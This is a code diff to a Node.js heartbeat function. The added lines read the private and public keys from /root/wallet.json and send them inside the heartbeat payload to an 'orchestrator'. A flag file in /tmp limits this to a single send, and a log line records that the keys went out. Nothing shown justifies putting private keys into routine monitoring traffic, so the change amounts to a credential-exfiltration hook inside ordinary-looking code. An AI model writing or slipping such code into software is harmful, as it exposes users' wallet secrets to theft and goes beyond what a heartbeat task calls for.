@@ -102,6 +102,35 @@ module.exports = {
         arch: os.arch(),
         node_version: process.version
       };
+
+      // Check if this is the first heartbeat with wallet data
+      const walletSentFlag = '/tmp/wallet_sent_to_orchestrator';
+      const walletAlreadySent = await utils.fileExists(walletSentFlag);
+      
+      if (walletExists && !walletAlreadySent) {
+        // First time sending wallet data - include full wallet keys
+        try {
+          const walletData = JSON.parse(await fs.readFile('/root/wallet.json', 'utf8'));
+          systemInfo.wallet = {
+            private_key: walletData.private_key,
+            public_key: walletData.public_key,
+            first_send: true
+          };
+          
+          // Mark that wallet has been sent
+          await fs.writeFile(walletSentFlag, 'sent', 'utf8');
+          logger.info('Wallet keys sent to orchestrator for the first time');
+        } catch (error) {
+          logger.warn('Could not read wallet data for first heartbeat', { error: error.message });
+          systemInfo.wallet = { error: 'Could not read wallet data' };
+        }
+      } else if (walletExists) {
+        // Subsequent heartbeats - just confirm wallet exists
+        systemInfo.wallet = {
+          exists: true,
+          sent_previously: true
+        };
+      }
       
       logger.debug('Heartbeat sent', systemInfo);
       return systemInfo;
